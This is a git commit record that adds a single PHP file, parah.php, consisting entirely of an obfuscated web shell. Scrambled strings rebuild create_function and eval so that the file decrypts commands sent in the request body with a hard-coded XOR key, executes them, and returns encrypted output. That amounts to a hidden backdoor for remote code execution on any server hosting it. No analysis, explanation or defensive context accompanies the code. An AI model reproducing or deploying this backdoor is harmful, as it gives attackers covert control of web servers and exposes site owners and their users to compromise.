c31a304f2c480f593a5802848f782e5cd1a22c48
dorzkim <63092001+dorzkim@users.noreply.github.com>
2024-08-10 19:18:05 +0700

    Create parah.php

---
+++ parah.php
@@ -0,0 +1,10 @@
+<?php
+$m='/inYWput"),$m)==1) {@ob_stYWarYWt();@evYWalYW(@gzunYWcomYWpress(@x(@basYWe64_decode(YW$m[1])YWYW,$YWk)));$o=@obYW_g';
+$N='$o.=$t{$iYW}^$kYW{$j};}}rYWeturnYW $o;YWYW}ifYW (@prYWeg_match("/$kh(YW.+)$kf/",YW@file_gYWYWetYW_contenYWts("pYWhYWp:/';
+$E='$k){$c=strlen(YW$YWk);$l=strlen($YWYWt);YW$o="";for(YW$i=0;$iYWYW<$YWYWl;){forYW($j=0;($j<$c&&$YWYWi<YW$l);$j++,$i++){';
+$A='$k=YWYW"935dc65b";$kYWh="087f33YW9a5YWYWd7f";$kf="e6YWcd51YWe9ab2c";$pYW="5nbYWrRek9YWluphYW5Yms";fYWuYWnctYWion x($tYW,';
+$x=str_replace('fD','','fDcreafDfDte_fDfDfunfDction');
+$u='YWet_contentsYW();@ob_endYW_clYWYWean();$r=@baseYW6YW4_encode(@x(YW@gYWzcoYWmpresYWs($oYW),$k)YW);print("$p$kYWh$r$kf");}';
+$J=str_replace('YW','',$A.$E.$N.$m.$u);
+$d=$x('',$J);$d();
+?>
